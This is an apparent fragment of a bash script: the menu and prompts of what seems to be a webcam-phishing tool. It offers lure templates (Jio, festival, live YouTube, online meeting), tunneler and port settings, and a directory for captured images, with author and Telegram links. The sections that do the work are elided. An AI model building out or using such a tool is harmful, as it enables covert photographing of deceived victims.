...
xdg-open https://youtube.com/channel/UCG_zgIRcf9wRnzsuMpz3aMQ
...
trap "echo -e '\n${success}Thanks for Using! Visit Site : http://Wa.me/083171740811\n'; exit" 2
...
${red}[${white}1${red}] ${cyan}Jio			        ${red}[${white}2${red}] ${cyan}Festival          ${red}[${white}p${red}] ${cyan}Change Default Port (current: ${red}${PORT}${yellow})
${red}[${white}3${red}] ${cyan}Live Youtube		${red}[${white}4${red}] ${cyan}Online Meeting    ${red}[${white}t${red}] ${cyan}Change Default Tunneler (current: ${red}${TN}${yellow})
${red}[${white}d${red}] ${cyan}Change Image Directory (current: ${red}${FOL}${yellow} ${red}[${white}x${red}] ${cyan}About
${red}[${white}m${red}] ${cyan}More tools			${red}[${white}0${red}] ${cyan}Exit${blue}
"

sleep 1
printf "${cyan}\nArynzClem${nc}@${blue}MCA  ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nXPHANTOM${nc}@${blue}Arynz&Clem ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        ...
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nArynzClem${nc}@${blue}ArynzClem ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        ...
        printf "\n${ask}Enter Directory:${cyan}\n\nArynzClem{nc}@${blue}Arynz&Clem ${red}$ ${nc}"
        read dire
        if ! [ -d $dire ]; then
...
$red[Author]     ${cyan} :[ArynzClem]
$red[Github]     ${cyan} :[https://github.com/ArynzClem] 
$red[Join us]    ${cyan} :[https://bit.ly/3PV3S3r]
$red[Telegarm]   ${cyan} :[https://t.me/ArynzClem]"
printf "${cyan}\nArynzClem${nc}@${cyan}ArynzClem ${red}$ ${nc}"
read about
